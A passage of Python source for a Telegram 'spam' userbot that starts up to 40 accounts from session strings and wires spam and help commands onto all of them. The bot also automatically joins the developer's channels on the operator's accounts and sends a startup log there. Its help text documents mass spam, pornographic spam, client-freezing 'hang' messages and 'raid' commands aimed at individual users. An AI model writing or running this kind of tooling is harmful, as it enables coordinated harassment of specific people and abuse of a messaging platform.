        print("String 35 Found")
        Riz35 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 35")
            await Riz35.start()
            await Riz35(functions.channels.JoinChannelRequest(channel="@RiZoeLX"))
            await Riz35(functions.channels.JoinChannelRequest(channel="@DNHxHELL"))
            await Riz35(functions.channels.JoinChannelRequest(channel="@Gladiators_Projects"))
            botme = await Riz35.get_me()
            id_35 = telethon.utils.get_peer_id(botme)
            CLIENTS.append(id_35)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 35 not Found")
        pass
        session_name = "rizoelxspam"
        Riz35 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Riz35.start()
        except Exception as e:
            pass


    if STRING36: 
        session_name = str(STRING36)
        print("String 36 Found")
        Riz36 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 36")
            await Riz36.start()
            botme = await Riz36.get_me()
            await Riz36(functions.channels.JoinChannelRequest(channel="@RiZoeLX"))
            await Riz36(functions.channels.JoinChannelRequest(channel="@DNHxHELL"))
            await Riz36(functions.channels.JoinChannelRequest(channel="@Gladiators_Projects"))
            id_36 = telethon.utils.get_peer_id(botme)
            CLIENTS.append(id_36)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 36 not Found")
        session_name = "rizoelxspam"
        Riz36 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Riz36.start()
        except Exception as e:
            pass
   
    if STRING37: 
        session_name = str(STRING37)
        print("String 37 Found")
        Riz37 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 37")
            await Riz37.start()
            botme = await Riz37.get_me()
            await Riz37(functions.channels.JoinChannelRequest(channel="@DNHxHELL"))
            await Riz37(functions.channels.JoinChannelRequest(channel="@RiZoeLX"))
            await Riz37(functions.channels.JoinChannelRequest(channel="@Gladiators_Projects"))
            id_37 = telethon.utils.get_peer_id(botme)
            CLIENTS.append(id_37)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 37 not Found")
        session_name = "rizoelxspam"
        Riz37 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Riz37.start()
        except Exception as e:
            pass
   
    if STRING38: 
        session_name = str(STRING38)
        print("String 38 Found")
        Riz38 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 38")
            await Riz38.start()
            botme = await Riz38.get_me()
            await Riz38(functions.channels.JoinChannelRequest(channel="@RiZoeLX"))
            await Riz38(functions.channels.JoinChannelRequest(channel="@DNHxHELL"))
            await Riz38(functions.channels.JoinChannelRequest(channel="@Gladiators_Projects"))
            id_38 = telethon.utils.get_peer_id(botme)
            CLIENTS.append(id_38)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 38 not Found")
        session_name = "rizoelxspam"
        Riz38 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Riz38.start()
        except Exception as e:
            pass
   
    if STRING39: 
        session_name = str(STRING39)
        print("String 39 Found")
        Riz39 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 39")
            await Riz39.start()
            botme = await Riz39.get_me()
            await Riz39(functions.channels.JoinChannelRequest(channel="@RiZoeLX"))
            await Riz39(functions.channels.JoinChannelRequest(channel="@DNHxHELL"))
            await Riz39(functions.channels.JoinChannelRequest(channel="@Gladiators_Projects"))
            id_39 = telethon.utils.get_peer_id(botme)
            CLIENTS.append(id_39)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 39 not Found")
        session_name = "rizoelxspam"
        Riz39 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Riz39.start()
        except Exception as e:
            pass
   
    if STRING40:
        session_name = str(STRING40)
        print("String 40 Found")
        Riz40 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 40")
            await Riz40.start()
            botme = await Riz40.get_me()
            await Riz40(functions.channels.JoinChannelRequest(channel="@RiZoeLX"))
            await Riz40(functions.channels.JoinChannelRequest(channel="@DNHxHELL"))
            await Riz40(functions.channels.JoinChannelRequest(channel="@Gladiators_Projects"))
            id_40 = telethon.utils.get_peer_id(botme)
            CLIENTS.append(id_40)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 40 not Found")
        session_name = "rizoelxspam"
        Riz40 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Riz40.start()
        except Exception as e:
            pass

# loop = asyncio.get_event_loop()
# loop = asyncio.new_event_loop()
# asyncio.set_event_loop(loop)
loop.run_until_complete(RiZoeLX())

async def logss():
     owner = int(OWNER_ID)
     Log_msg = "**🔶 RiZoeL X Spam Started 🔶 **\n\n"
     Log_msg += f"• **Owner:** [{owner}](tg://user?id={owner}) \n"
     if BOT_TOKEN:
        from assistant import RiZoeL
        Findme = await RiZoeL.get_me()
        Name = Findme.first_name
        username = Findme.username
        id = telethon.utils.get_peer_id(Findme)
        XX.append(id)
        message = "/start"
        Log_msg += f"• **Assistant:** On \n"
        Log_msg += f" × Assistant Name: {Name} \n × Assistant Username: @{username} \n"
        try:
           if Riz: 
                  await Riz.send_message(username, message) 
           if Riz2: 
                  await Riz2.send_message(username, message) 
           if Riz3: 
                  await Riz3.send_message(username, message) 
           if Riz4: 
                  await Riz4.send_message(username, message) 
           if Riz5: 
                  await Riz5.send_message(username, message) 
           if Riz6: 
                  await Riz6.send_message(username, message) 
           if Riz7: 
                  await Riz7.send_message(username, message) 
           if Riz8: 
                  await Riz8.send_message(username, message) 
           if Riz9: 
                  await Riz9.send_message(username, message) 
           if Riz10: 
                  await Riz10.send_message(username, message) 
           if Riz11:
                  await Riz11.send_message(username, message) 
           if Riz12: 
                  await Riz12.send_message(username, message) 
           if Riz13: 
                  await Riz13.send_message(username, message) 
           if Riz14: 
                  await Riz14.send_message(username, message) 
           if Riz15: 
                  await Riz15.send_message(username, message) 
           if Riz16: 
                  await Riz16.send_message(username, message) 
           if Riz17: 
                  await Riz17.send_message(username, message) 
           if Riz18: 
                  await Riz18.send_message(username, message) 
           if Riz19: 
                  await Riz19.send_message(username, message) 
           if Riz20: 
                  await Riz20.send_message(username, message) 
           if Riz21: 
                  await Riz21.send_message(username, message) 
           if Riz22: 
                  await Riz22.send_message(username, message) 
           if Riz23: 
                  await Riz23.send_message(username, message) 
           if Riz24: 
                  await Riz24.send_message(username, message) 
           if Riz25: 
                  await Riz25.send_message(username, message) 
           if Riz26: 
                  await Riz26.send_message(username, message) 
           if Riz27: 
                  await Riz27.send_message(username, message) 
           if Riz28: 
                  await Riz28.send_message(username, message) 
           if Riz29: 
                  await Riz29.send_message(username, message) 
           if Riz30: 
                  await Riz30.send_message(username, message) 
           if Riz31: 
                  await Riz31.send_message(username, message) 
           if Riz32: 
                  await Riz32.send_message(username, message) 
           if Riz33: 
                  await Riz33.send_message(username, message) 
           if Riz34: 
                  await Riz34.send_message(username, message) 
           if Riz35: 
                  await Riz35.send_message(username, message) 
           if Riz36: 
                  await Riz36.send_message(username, message) 
           if Riz37: 
                  await Riz37.send_message(username, message) 
           if Riz38: 
                  await Riz38.send_message(username, message) 
           if Riz39: 
                  await Riz39.send_message(username, message) 
           if Riz40: 
                  await Riz40.send_message(username, message)          
        except Exception as ex:
           print(ex)
     else:
        Log_msg += "• **Assistant:** Off \n"
     ids = 0
     try:
        if STRING:
           ids += 1
        if STRING2:
           ids += 1  
        if STRING3:
           ids += 1  
        if STRING4:
           ids += 1
        if STRING5:
           ids += 1
        if STRING6:
           ids += 1
        if STRING7:
           ids += 1
        if STRING8:
           ids += 1
        if STRING9:
           ids += 1
        if STRING10:
           ids += 1
        if STRING11:
           ids += 1
        if STRING11:
           ids += 1
        if STRING13:
           ids += 1
        if STRING14:
           ids += 1
        if STRING15:
           ids += 1
        if STRING16:
           ids += 1
        if STRING17:
           ids += 1
        if STRING18:
           ids += 1
        if STRING19:
           ids += 1
        if STRING20:
           ids += 1
        if STRING21:
           ids += 1
        if STRING22:
           ids += 1
        if STRING23:
           ids += 1
        if STRING24:
           ids += 1
        if STRING25:
           ids += 1
        if STRING26:
           ids += 1
        if STRING27:
           ids += 1
        if STRING28:
           ids += 1
        if STRING29:
           ids += 1
        if STRING30:
           ids += 1
        if STRING31:
           ids += 1
        if STRING32:
           ids += 1
        if STRING33:
           ids += 1
        if STRING34:
           ids += 1
        if STRING35:
           ids += 1
        if STRING36:
           ids += 1
        if STRING37:
           ids += 1
        if STRING38:
           ids += 1
        if STRING39:
           ids += 1
        if STRING40:
           ids += 1
        Log_msg += f"• **Active Ids:** `{ids}` \n"
     except Exception as ex:
        pass
     Log_msg += f"• **Cmd Handler:** `{hl}` \n\n"
     Log_msg += f"**Powered By @RiZoeLX** \n"
     try:
       await Riz(functions.channels.JoinChannelRequest(channel="@RiZoelXSpam_Logs"))
       await Riz.send_message(-1001647867895, Log_msg)
       await Riz(LeaveChannelRequest(-1001647867895))
     except Exception as ex:
        print(ex)
        pass

# Userbot Cmds #
def xHell(milliseconds: int) -> str:
    seconds, milliseconds = divmod(int(milliseconds), 1000)
    minutes, seconds = divmod(seconds, 60)
    hours, minutes = divmod(minutes, 60)
    days, hours = divmod(hours, 24)
    weeks, days = divmod(days, 7)
    xd = (
        ((str(weeks) + "ᴡ:") if weeks else "")
        + ((str(days) + "ᴅ:") if days else "")
        + ((str(hours) + "ʜ:") if hours else "")
        + ((str(minutes) + "ᴍ:") if minutes else "")
        + ((str(seconds) + "s:") if seconds else "")
    )
    if xd.endswith(":"):
        return xd[:-1]
    else:
        return xd

pongg = PING_MSG if ALIVE_PIC else "ʀɪᴢᴏᴇʟ X sᴘᴀᴍ"
RIZ_PIC = ALIVE_PIC if ALIVE_PIC else "https://telegra.ph/file/ba87c58f01a6fcb5ef512.jpg"
Alivemsg = ALIVE_MSG if ALIVE_MSG else "𝗥𝗶𝗭𝗼𝗲𝗟 𝗫 𝗦𝗽𝗮𝗺 𝗛𝗲𝗿𝗲."

@Riz.on(events.NewMessage(incoming=True, pattern=r"\%sping" % hl))
@Riz2.on(events.NewMessage(incoming=True, pattern=r"\%sping" % hl))
@Riz3.on(events.NewMessage(incoming=True, pattern=r"\%sping" % hl))
@Riz4.on(events.NewMessage(incoming=True, pattern=r"\%sping" % hl))
@Riz5.on(events.NewMessage(incoming=True, pattern=r"\%sping" % hl))
@Riz6.on(events.NewMessage(incoming=True, pattern=r"\%sping" % hl))
@Riz7.on(events.NewMessage(incoming=True, pattern=r"\%sping" % hl))
@Riz8.on(events.NewMessage(incoming=True, pattern=r"\%sping" % hl))
@Riz9.on(events.NewMessage(incoming=True, pattern=r"\%sping" % hl))
@Riz10.on(events.NewMessage(incoming=True, pattern=r"\%sping" % hl))
@Riz11.on(events.NewMessage(incoming=True, pattern=r"\%sping" % hl))
@Riz12.on(events.NewMessage(incoming=True, pattern=r"\%sping" % hl))
@Riz13.on(events.NewMessage(incoming=True, pattern=r"\%sping" % hl))
@Riz14.on(events.NewMessage(incoming=True, pattern=r"\%sping" % hl))
@Riz15.on(events.NewMessage(incoming=True, pattern=r"\%sping" % hl))
@Riz16.on(events.NewMessage(incoming=True, pattern=r"\%sping" % hl))
@Riz17.on(events.NewMessage(incoming=True, pattern=r"\%sping" % hl))
@Riz18.on(events.NewMessage(incoming=True, pattern=r"\%sping" % hl))
@Riz19.on(events.NewMessage(incoming=True, pattern=r"\%sping" % hl))
@Riz20.on(events.NewMessage(incoming=True, pattern=r"\%sping" % hl))
@Riz21.on(events.NewMessage(incoming=True, pattern=r"\%sping" % hl))
@Riz21.on(events.NewMessage(incoming=True, pattern=r"\%sping" % hl))
@Riz22.on(events.NewMessage(incoming=True, pattern=r"\%sping" % hl))
@Riz23.on(events.NewMessage(incoming=True, pattern=r"\%sping" % hl))
@Riz24.on(events.NewMessage(incoming=True, pattern=r"\%sping" % hl))
@Riz25.on(events.NewMessage(incoming=True, pattern=r"\%sping" % hl))
@Riz26.on(events.NewMessage(incoming=True, pattern=r"\%sping" % hl))
@Riz27.on(events.NewMessage(incoming=True, pattern=r"\%sping" % hl))
@Riz28.on(events.NewMessage(incoming=True, pattern=r"\%sping" % hl))
@Riz29.on(events.NewMessage(incoming=True, pattern=r"\%sping" % hl))
@Riz30.on(events.NewMessage(incoming=True, pattern=r"\%sping" % hl))
@Riz31.on(events.NewMessage(incoming=True, pattern=r"\%sping" % hl))
@Riz32.on(events.NewMessage(incoming=True, pattern=r"\%sping" % hl))
@Riz33.on(events.NewMessage(incoming=True, pattern=r"\%sping" % hl))
@Riz34.on(events.NewMessage(incoming=True, pattern=r"\%sping" % hl))
@Riz35.on(events.NewMessage(incoming=True, pattern=r"\%sping" % hl))
@Riz36.on(events.NewMessage(incoming=True, pattern=r"\%sping" % hl))
@Riz37.on(events.NewMessage(incoming=True, pattern=r"\%sping" % hl))
@Riz38.on(events.NewMessage(incoming=True, pattern=r"\%sping" % hl))
@Riz39.on(events.NewMessage(incoming=True, pattern=r"\%sping" % hl))
@Riz40.on(events.NewMessage(incoming=True, pattern=r"\%sping" % hl))
async def ping(e):
    if e.sender_id in SUDO_USERS or e.sender_id in DEV:
        if e.reply_to_msg_id:
            fuk = await e.respond("Pᴏɴɢ!!.....", reply_to=e.reply_to_msg_id)
        else:
            fuk = await e.reply("Pᴏɴɢ!!.....")  
        start = datetime.now()
        end = datetime.now()
        ms = (end-start).microseconds / 1000
        uptime = xHell((time.time() - StartTime) * 1000)
        pingop = f"⌾ {pongg} ⌾ \n\n ༝ ᴘɪɴɢ: `{ms}` ᴍs \n ༝ ᴜᴘᴛɪᴍᴇ: {uptime}"
        await fuk.edit(pingop)

rizoel = f"✧ {Alivemsg} ✧\n\n"
rizoel += f"════════════════════\n"
rizoel += f"► **ᴘʏᴛʜᴏɴ ᴠᴇʀsɪᴏɴ** : `3.9.6`\n"
rizoel += f"► **ᴛᴇʟᴇᴛʜᴏɴ ᴠᴇʀsɪᴏɴ** : `{version.__version__}`\n"
rizoel += f"► **ʀɪᴢᴏᴇʟXsᴘᴀᴍ ᴠᴇʀsɪᴏɴ**  : `{rizoelversion}`\n"  
rizoel += f"► **sᴜᴘᴘᴏʀᴛ** : [JOIN](https://t.me/DNHxHELL)\n"
rizoel += f"► **ᴄʜᴀɴɴᴇʟ** : [JOIN](https://t.me/RiZoeLX)\n"
rizoel += f"════════════════════\n\n"
rizoel += f"[•Repo•](https://github.com/MrRizoel/RiZoeLXSpam)"            
         
@Riz.on(events.NewMessage(incoming=True, pattern=r"\%salive(?: |$)(.*)" % hl))
@Riz2.on(events.NewMessage(incoming=True, pattern=r"\%salive(?: |$)(.*)" % hl))
@Riz3.on(events.NewMessage(incoming=True, pattern=r"\%salive(?: |$)(.*)" % hl))
@Riz4.on(events.NewMessage(incoming=True, pattern=r"\%salive(?: |$)(.*)" % hl))
@Riz5.on(events.NewMessage(incoming=True, pattern=r"\%salive(?: |$)(.*)" % hl))
@Riz6.on(events.NewMessage(incoming=True, pattern=r"\%salive(?: |$)(.*)" % hl))
@Riz7.on(events.NewMessage(incoming=True, pattern=r"\%salive(?: |$)(.*)" % hl))
@Riz8.on(events.NewMessage(incoming=True, pattern=r"\%salive(?: |$)(.*)" % hl))
@Riz9.on(events.NewMessage(incoming=True, pattern=r"\%salive(?: |$)(.*)" % hl))
@Riz10.on(events.NewMessage(incoming=True, pattern=r"\%salive(?: |$)(.*)" % hl))
@Riz11.on(events.NewMessage(incoming=True, pattern=r"\%salive(?: |$)(.*)" % hl))
@Riz12.on(events.NewMessage(incoming=True, pattern=r"\%salive(?: |$)(.*)" % hl))
@Riz13.on(events.NewMessage(incoming=True, pattern=r"\%salive(?: |$)(.*)" % hl))
@Riz14.on(events.NewMessage(incoming=True, pattern=r"\%salive(?: |$)(.*)" % hl))
@Riz15.on(events.NewMessage(incoming=True, pattern=r"\%salive(?: |$)(.*)" % hl))
@Riz16.on(events.NewMessage(incoming=True, pattern=r"\%salive(?: |$)(.*)" % hl))
@Riz17.on(events.NewMessage(incoming=True, pattern=r"\%salive(?: |$)(.*)" % hl))
@Riz18.on(events.NewMessage(incoming=True, pattern=r"\%salive(?: |$)(.*)" % hl))
@Riz19.on(events.NewMessage(incoming=True, pattern=r"\%salive(?: |$)(.*)" % hl))
@Riz20.on(events.NewMessage(incoming=True, pattern=r"\%salive(?: |$)(.*)" % hl))
@Riz21.on(events.NewMessage(incoming=True, pattern=r"\%salive(?: |$)(.*)" % hl))
@Riz22.on(events.NewMessage(incoming=True, pattern=r"\%salive(?: |$)(.*)" % hl))
@Riz23.on(events.NewMessage(incoming=True, pattern=r"\%salive(?: |$)(.*)" % hl))
@Riz24.on(events.NewMessage(incoming=True, pattern=r"\%salive(?: |$)(.*)" % hl))
@Riz25.on(events.NewMessage(incoming=True, pattern=r"\%salive(?: |$)(.*)" % hl))
@Riz26.on(events.NewMessage(incoming=True, pattern=r"\%salive(?: |$)(.*)" % hl))
@Riz27.on(events.NewMessage(incoming=True, pattern=r"\%salive(?: |$)(.*)" % hl))
@Riz28.on(events.NewMessage(incoming=True, pattern=r"\%salive(?: |$)(.*)" % hl))
@Riz29.on(events.NewMessage(incoming=True, pattern=r"\%salive(?: |$)(.*)" % hl))
@Riz30.on(events.NewMessage(incoming=True, pattern=r"\%salive(?: |$)(.*)" % hl))
@Riz31.on(events.NewMessage(incoming=True, pattern=r"\%salive(?: |$)(.*)" % hl))
@Riz32.on(events.NewMessage(incoming=True, pattern=r"\%salive(?: |$)(.*)" % hl))
@Riz33.on(events.NewMessage(incoming=True, pattern=r"\%salive(?: |$)(.*)" % hl))
@Riz34.on(events.NewMessage(incoming=True, pattern=r"\%salive(?: |$)(.*)" % hl))
@Riz35.on(events.NewMessage(incoming=True, pattern=r"\%salive(?: |$)(.*)" % hl))
@Riz36.on(events.NewMessage(incoming=True, pattern=r"\%salive(?: |$)(.*)" % hl))
@Riz37.on(events.NewMessage(incoming=True, pattern=r"\%salive(?: |$)(.*)" % hl))
@Riz38.on(events.NewMessage(incoming=True, pattern=r"\%salive(?: |$)(.*)" % hl))
@Riz39.on(events.NewMessage(incoming=True, pattern=r"\%salive(?: |$)(.*)" % hl))
@Riz40.on(events.NewMessage(incoming=True, pattern=r"\%salive(?: |$)(.*)" % hl))
async def alive(event):
   if event.sender_id in SUDO_USERS or event.sender_id in DEV:
     await event.client.send_file(event.chat_id,
                                  RIZ_PIC,
                                  caption=rizoel)

@Riz.on(events.NewMessage(incoming=True, pattern=r"\%srestart" % hl))
@Riz2.on(events.NewMessage(incoming=True, pattern=r"\%srestart" % hl))
@Riz3.on(events.NewMessage(incoming=True, pattern=r"\%srestart" % hl))
@Riz4.on(events.NewMessage(incoming=True, pattern=r"\%srestart" % hl))
@Riz5.on(events.NewMessage(incoming=True, pattern=r"\%srestart" % hl))
@Riz6.on(events.NewMessage(incoming=True, pattern=r"\%srestart" % hl))
@Riz7.on(events.NewMessage(incoming=True, pattern=r"\%srestart" % hl))
@Riz8.on(events.NewMessage(incoming=True, pattern=r"\%srestart" % hl))
@Riz9.on(events.NewMessage(incoming=True, pattern=r"\%srestart" % hl))
@Riz10.on(events.NewMessage(incoming=True, pattern=r"\%srestart" % hl))
@Riz11.on(events.NewMessage(incoming=True, pattern=r"\%srestart" % hl))
@Riz12.on(events.NewMessage(incoming=True, pattern=r"\%srestart" % hl))
@Riz13.on(events.NewMessage(incoming=True, pattern=r"\%srestart" % hl))
@Riz14.on(events.NewMessage(incoming=True, pattern=r"\%srestart" % hl))
@Riz15.on(events.NewMessage(incoming=True, pattern=r"\%srestart" % hl))
@Riz16.on(events.NewMessage(incoming=True, pattern=r"\%srestart" % hl))
@Riz17.on(events.NewMessage(incoming=True, pattern=r"\%srestart" % hl))
@Riz18.on(events.NewMessage(incoming=True, pattern=r"\%srestart" % hl))
@Riz19.on(events.NewMessage(incoming=True, pattern=r"\%srestart" % hl))
@Riz20.on(events.NewMessage(incoming=True, pattern=r"\%srestart" % hl))
@Riz21.on(events.NewMessage(incoming=True, pattern=r"\%srestart" % hl))
@Riz21.on(events.NewMessage(incoming=True, pattern=r"\%srestart" % hl))
@Riz22.on(events.NewMessage(incoming=True, pattern=r"\%srestart" % hl))
@Riz23.on(events.NewMessage(incoming=True, pattern=r"\%srestart" % hl))
@Riz24.on(events.NewMessage(incoming=True, pattern=r"\%srestart" % hl))
@Riz25.on(events.NewMessage(incoming=True, pattern=r"\%srestart" % hl))
@Riz26.on(events.NewMessage(incoming=True, pattern=r"\%srestart" % hl))
@Riz27.on(events.NewMessage(incoming=True, pattern=r"\%srestart" % hl))
@Riz28.on(events.NewMessage(incoming=True, pattern=r"\%srestart" % hl))
@Riz29.on(events.NewMessage(incoming=True, pattern=r"\%srestart" % hl))
@Riz30.on(events.NewMessage(incoming=True, pattern=r"\%srestart" % hl))
@Riz31.on(events.NewMessage(incoming=True, pattern=r"\%srestart" % hl))
@Riz32.on(events.NewMessage(incoming=True, pattern=r"\%srestart" % hl))
@Riz33.on(events.NewMessage(incoming=True, pattern=r"\%srestart" % hl))
@Riz34.on(events.NewMessage(incoming=True, pattern=r"\%srestart" % hl))
@Riz35.on(events.NewMessage(incoming=True, pattern=r"\%srestart" % hl))
@Riz36.on(events.NewMessage(incoming=True, pattern=r"\%srestart" % hl))
@Riz37.on(events.NewMessage(incoming=True, pattern=r"\%srestart" % hl))
@Riz38.on(events.NewMessage(incoming=True, pattern=r"\%srestart" % hl))
@Riz39.on(events.NewMessage(incoming=True, pattern=r"\%srestart" % hl))
@Riz40.on(events.NewMessage(incoming=True, pattern=r"\%srestart" % hl))
async def restart(e):
    if e.sender_id in SUDO_USERS or e.sender_id in DEV:
        text = f"**Restarting** \n\n Please Wait Until It Starts Again"
        await e.reply(text, parse_mode=None, link_preview=None)
        try:
            await Riz.disconnect()
        except Exception:
            pass
        try:
            await Riz2.disconnect()
        except Exception:
            pass
        try:
            await Riz3.disconnect()
        except Exception:
            pass
        try:
            await Riz4.disconnect()
        except Exception:
            pass
        try:
            await Riz5.disconnect()
        except Exception:
            pass
        try:
            await Riz6.disconnect()
        except Exception:
            pass
        try:
            await Riz7.disconnect()
        except Exception:
            pass
        try:
            await Riz8.disconnect()
        except Exception:
            pass
        try:
            await Riz9.disconnect()
        except Exception:
            pass
        try:
            await Riz10.disconnect()
        except Exception:
            pass
        try:
            await Riz11.disconnect()
        except Exception:
            pass
        try:
            await Riz12.disconnect()
        except Exception:
            pass
        try:
            await Riz13.disconnect()
        except Exception:
            pass
        try:
            await Riz14.disconnect()
        except Exception:
            pass
        try:
            await Riz15.disconnect()
        except Exception:
            pass
        try:
            await Riz16.disconnect()
        except Exception:
            pass
        try:
            await Riz17.disconnect()
        except Exception:
            pass
        try:
            await Riz18.disconnect()
        except Exception:
            pass
        try:
            await Riz19.disconnect()
        except Exception:
            pass
        try:
            await Riz20.disconnect()
        except Exception:
            pass
        try:
            await Riz21.disconnect()
        except Exception:
            pass
        try:
            await Riz22.disconnect()
        except Exception:
            pass
        try:
            await Riz23.disconnect()
        except Exception:
            pass
        try:
            await Riz24.disconnect()
        except Exception:
            pass
        try:
            await Riz25.disconnect()
        except Exception:
            pass
        try:
            await Riz26.disconnect()
        except Exception:
            pass
        try:
            await Riz27.disconnect()
        except Exception:
            pass
        try:
            await Riz28.disconnect()
        except Exception:
            pass
        try:
            await Riz29.disconnect()
        except Exception:
            pass
        try:
            await Riz30.disconnect()
        except Exception:
            pass
        try:
            await Riz31.disconnect()
        except Exception:
            pass
        try:
            await Riz32.disconnect()
        except Exception:
            pass
        try:
            await Riz33.disconnect()
        except Exception:
            pass
        try:
            await Riz34.disconnect()
        except Exception:
            pass
        try:
            await Riz35.disconnect()
        except Exception:
            pass
        try:
            await Riz36.disconnect()
        except Exception:
            pass
        try:
            await Riz37.disconnect()
        except Exception:
            pass
        try:
            await Riz38.disconnect()
        except Exception:
            pass
        try:
            await Riz39.disconnect()
        except Exception:
            pass
        try:
            await Riz40.disconnect()
        except Exception:
            pass

        os.execl(sys.executable, sys.executable, *sys.argv)
        quit()

@Riz.on(events.NewMessage(incoming=True, pattern=r"\%shelp(?: |$)(.*)" % hl))
@Riz2.on(events.NewMessage(incoming=True, pattern=r"\%shelp(?: |$)(.*)" % hl))
@Riz3.on(events.NewMessage(incoming=True, pattern=r"\%shelp(?: |$)(.*)" % hl))
@Riz4.on(events.NewMessage(incoming=True, pattern=r"\%shelp(?: |$)(.*)" % hl))
@Riz5.on(events.NewMessage(incoming=True, pattern=r"\%shelp(?: |$)(.*)" % hl))
@Riz6.on(events.NewMessage(incoming=True, pattern=r"\%shelp(?: |$)(.*)" % hl))
@Riz7.on(events.NewMessage(incoming=True, pattern=r"\%shelp(?: |$)(.*)" % hl))
@Riz8.on(events.NewMessage(incoming=True, pattern=r"\%shelp(?: |$)(.*)" % hl))
@Riz9.on(events.NewMessage(incoming=True, pattern=r"\%shelp(?: |$)(.*)" % hl))
@Riz10.on(events.NewMessage(incoming=True, pattern=r"\%shelp(?: |$)(.*)" % hl))
@Riz11.on(events.NewMessage(incoming=True, pattern=r"\%shelp(?: |$)(.*)" % hl))
@Riz12.on(events.NewMessage(incoming=True, pattern=r"\%shelp(?: |$)(.*)" % hl))
@Riz13.on(events.NewMessage(incoming=True, pattern=r"\%shelp(?: |$)(.*)" % hl))
@Riz14.on(events.NewMessage(incoming=True, pattern=r"\%shelp(?: |$)(.*)" % hl))
@Riz15.on(events.NewMessage(incoming=True, pattern=r"\%shelp(?: |$)(.*)" % hl))
@Riz16.on(events.NewMessage(incoming=True, pattern=r"\%shelp(?: |$)(.*)" % hl))
@Riz17.on(events.NewMessage(incoming=True, pattern=r"\%shelp(?: |$)(.*)" % hl))
@Riz18.on(events.NewMessage(incoming=True, pattern=r"\%shelp(?: |$)(.*)" % hl))
@Riz19.on(events.NewMessage(incoming=True, pattern=r"\%shelp(?: |$)(.*)" % hl))
@Riz20.on(events.NewMessage(incoming=True, pattern=r"\%shelp(?: |$)(.*)" % hl))
@Riz21.on(events.NewMessage(incoming=True, pattern=r"\%shelp(?: |$)(.*)" % hl))
@Riz22.on(events.NewMessage(incoming=True, pattern=r"\%shelp(?: |$)(.*)" % hl))
@Riz23.on(events.NewMessage(incoming=True, pattern=r"\%shelp(?: |$)(.*)" % hl))
@Riz24.on(events.NewMessage(incoming=True, pattern=r"\%shelp(?: |$)(.*)" % hl))
@Riz25.on(events.NewMessage(incoming=True, pattern=r"\%shelp(?: |$)(.*)" % hl))
@Riz26.on(events.NewMessage(incoming=True, pattern=r"\%shelp(?: |$)(.*)" % hl))
@Riz27.on(events.NewMessage(incoming=True, pattern=r"\%shelp(?: |$)(.*)" % hl))
@Riz28.on(events.NewMessage(incoming=True, pattern=r"\%shelp(?: |$)(.*)" % hl))
@Riz29.on(events.NewMessage(incoming=True, pattern=r"\%shelp(?: |$)(.*)" % hl))
@Riz30.on(events.NewMessage(incoming=True, pattern=r"\%shelp(?: |$)(.*)" % hl))
@Riz31.on(events.NewMessage(incoming=True, pattern=r"\%shelp(?: |$)(.*)" % hl))
@Riz32.on(events.NewMessage(incoming=True, pattern=r"\%shelp(?: |$)(.*)" % hl))
@Riz33.on(events.NewMessage(incoming=True, pattern=r"\%shelp(?: |$)(.*)" % hl))
@Riz34.on(events.NewMessage(incoming=True, pattern=r"\%shelp(?: |$)(.*)" % hl))
@Riz35.on(events.NewMessage(incoming=True, pattern=r"\%shelp(?: |$)(.*)" % hl))
@Riz36.on(events.NewMessage(incoming=True, pattern=r"\%shelp(?: |$)(.*)" % hl))
@Riz37.on(events.NewMessage(incoming=True, pattern=r"\%shelp(?: |$)(.*)" % hl))
@Riz38.on(events.NewMessage(incoming=True, pattern=r"\%shelp(?: |$)(.*)" % hl))
@Riz39.on(events.NewMessage(incoming=True, pattern=r"\%shelp(?: |$)(.*)" % hl))
@Riz40.on(events.NewMessage(incoming=True, pattern=r"\%shelp(?: |$)(.*)" % hl))
async def bot_help(e):
    if e.sender_id in SUDO_USERS or e.sender_id in DEV:
        RiZoeL = e.text.split(" ")
        if len(RiZoeL) > 1:
            helping = RiZoeL[1]
            if helping.lower() == "spam":
                await e.reply(spam_help)
            elif helping.lower() == "raid":
                await e.reply(raid_help)
            elif helping.lower() == "dm":
                await e.reply(dm_help)
            elif helping.lower() == "echo":
                await e.reply(echo_help)
            elif helping.lower() == "userbot":
                await e.reply(userbot_help)
            elif helping.lower() == "join":
                await e.reply(join_help)
            elif helping.lower() == "leave":
                await e.reply(leave_help)
            elif helping.lower() == "extra":
                await e.reply(extra_help)
            elif helping.lower() == "owner":
                await e.reply(owner_help)
            else:
                await e.reply(help_menu)
        else:
            await e.reply(help_menu)


spam_help = f"""
**• Spam Cmds •**

**spam**: Spams a message for given counter(<= 100).
commands:
i) {hl}spam <count> <message to spam> (you can reply any message if you want bot to reply that message and do spamming)
ii) {hl}spam <count> <replying any message>

**bigspam**: Spams a message for given counter.
commands:
i) {hl}bigspam <count> <message to spam> (you can reply any message if you want bot to reply that message and do spamming)
ii) {hl}bigspam <count> <replying any message>

**delayspam**: Delay spam a text for given counter after given time.
commands:
i) {hl}delayspam <delay time(seconds)> <count> <message to spam> (you can reply any message if you want bot to reply that message and do spamming)
ii) {hl}delayspam <delay time(seconds)> <count> <replying any message>

**pornspam**: Spams hanging message for given counter.
commands:
i) {hl}pornspam <counter>

**packspam**: Spams all stickers from sticker pack.
commands: 
i) {hl}packspam (replying to any sticker)

**hang**: Spams hanging message for given counter.
commands:
i) {hl}hang <counter> (you can reply any message if you want bot to reply that message and do spamming)

**© @RiZoeLX**
"""


raid_help = f"""
**• Raid Cmds •**

**raid:** Activates raid on any individual user for given range.
commands:
i) {hl}raid <count> <username>
ii) {hl}raid <count> <reply to the user>

**Delayraid**: Activates raid on any individual user for given range.
